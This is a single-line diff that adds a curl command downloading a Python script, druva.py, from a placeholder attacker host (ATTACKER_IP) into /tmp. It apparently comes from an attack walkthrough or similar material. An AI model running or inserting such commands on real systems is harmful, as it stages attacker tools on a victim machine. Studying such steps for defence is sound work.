@@ -1,0 +1,1 @@
+curl -o /tmp/druva.py http://ATTACKER_IP/tools/druva.py
